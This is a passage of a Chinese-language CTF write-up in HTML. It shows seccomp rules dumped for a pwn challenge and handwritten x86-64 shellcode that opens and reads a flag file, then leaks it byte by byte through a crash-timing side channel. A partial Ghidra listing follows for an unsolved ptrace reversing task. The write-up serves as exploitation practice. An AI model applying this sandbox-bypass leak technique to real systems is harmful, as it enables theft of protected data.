style="color:#393A34">[</span><span class="token plain">r9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">12</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">80</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">43</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">01</span><span class="token plain">             add    BYTE PTR </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">rbx</span><span class="token operator" style="color:#393A34">+</span><span class="token number" style="color:#36acaa">0x16</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">16</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">05</span><span class="token plain">                   syscall </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">18</span><span class="token operator" style="color:#393A34">:</span><span class="token plain">   </span><span class="token number" style="color:#36acaa">90</span><span class="token plain">                      nop</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="2-bypass-seccomp">2. bypass seccomp<a href="#2-bypass-seccomp" class="hash-link" aria-label="2. bypass seccomp的直接链接" title="2. bypass seccomp的直接链接">​</a></h4>
<p>先用<code>seccomp-tools</code>导出沙箱规则：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> line  CODE  JT   JF      K</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0000</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00000004</span><span class="token plain">  A </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> arch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0001</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x15</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x06</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xc000003e</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> ARCH_X86_64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0008</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0002</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00000000</span><span class="token plain">  A </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> sys_number</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0003</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x35</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40000000</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40000000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0005</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0004</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x15</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x03</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xffffffff</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xffffffff</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0008</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0005</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x15</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00000000</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> read</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0007</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0006</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x15</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x01</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00000002</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">A </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> open</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">goto</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0008</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0007</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x06</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x7fff0000</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> ALLOW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token number" style="color:#36acaa">0008</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x06</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x00000000</span><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> KILL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以看到只能用open和read两个系统调用，我们没办法输出了。我们唯一的输出就是可以让程序crash。所以我们可以写一个简单的程序，判断第i个字符是不是我们的输入，如果是就crash，然后我们遍历ASCII字符直到找到让 程序crash的那个字符，就能泄露出一个字节。实际操作中，我们的输入不能太快，否则会出现我们还没知道程序crash，就已经发送了好几个字符的情况。我的测试中，发送字符间隔为0.2秒时，程序crash的时间会稳定领先1个字符。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// we already input &quot;flag\0&quot; at RSI, now we open it</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rsi</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rdx</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// read flag content</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea rsi</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">r10 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x400</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rax</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x100</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// read i-th character into r8b</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// we also want to crash directly if this is null-byte</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r8b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">r10 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0x400</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmp r8b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jz end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// loop reading from stdin until equal</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">loop</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea rsi</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">r10 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x800</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rax</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r9b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">r10 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x800</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmp r8b</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> r9b</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jnz loop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// crash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hlt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><code>flag{practice_handwrite_shellcode}</code></p>
<p>不太清楚已经在沙箱里的情况下，重新调用prctl或者seccomp相关函数能不能取消沙箱（我觉得应该不能，不然这沙箱不是没什么用了）</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rev---peertrace未做出">rev - peertrace（未做出）<a href="#rev---peertrace未做出" class="hash-link" aria-label="rev - peertrace（未做出）的直接链接" title="rev - peertrace（未做出）的直接链接">​</a></h2>
<p>第一次见用ptrace的程序，这个题给了两个程序，peer用fork生成子进程，子进程调用<code>PTRACE_TRACEME</code>后execve了另一个程序puppet，然后执行。puppet逻辑很简单，就是读入一个字符串，和0x28进行xor后与字符串比较，但实际上peer会断点修改输入，所以还是比较复杂的。</p>
<p>因为<code>tracer</code>本身还是可以GDB调试的，所以我们可以知道什么时候<code>tracer</code>对<code>tracee</code>进行了修改（特征很明显，无非就是当某些寄存器满  足某种条件是会做某种操作）。主要分为两个阶段，倒着说：</p>
<p>第二阶段发生在异或时，每个字符异或都会下个断点，和某个字符串的对应字符进行加减运算。这个比较好逆向，只是不知道异或和加减哪个前哪个后，可以都试试。</p>
<p>第一阶段则发生在刚输入之后，会对输入的0x30个字节每8个字节为单位进行一些对换和加减。这部分有段非常难看懂的汇编，直接把ghidra反编译器整不会了，所以这部分我逆向代码应该是写错了，没得到结果。现在想想这部分应该直接angr，这个难度的加密ANGR绝对是可以跑出来的，只是我有点懒得写了。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">001013</span><span class="token plain">c0 </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> c2        MOV        RDX</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">c3 </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">d </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c0     LEA        uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">local_48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">c7 </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token plain">        MOV        qword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">local_48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">RDX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">ca </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c0     MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">=</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">local_48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">ce </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 c0        MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">d1 </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token plain">        MOV        qword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_160</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            a8 fe ff ff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">d8 </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c5     MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">dc </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c0        MOV        byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">df </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">b </span><span class="token number" style="color:#36acaa">85</span><span class="token plain">        MOV        uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">qword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_160</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            a8 fe ff ff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">5</span><span class="token plain"> swap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013e6</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">88</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c5        MOV        byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013e9</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c1     MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_48</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013</span><span class="token plain">ed </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 c0        MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013f</span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">48</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">89</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">85</span><span class="token plain">        MOV        qword ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_158</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            b0 fe ff ff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">001013f</span><span class="token number" style="color:#36acaa">7</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0f</span><span class="token plain"> b6 </span><span class="token number" style="color:#36acaa">45</span><span class="token plain"> c7     MOVZX      uVar6</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">byte ptr </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">RBP </span><span class="token 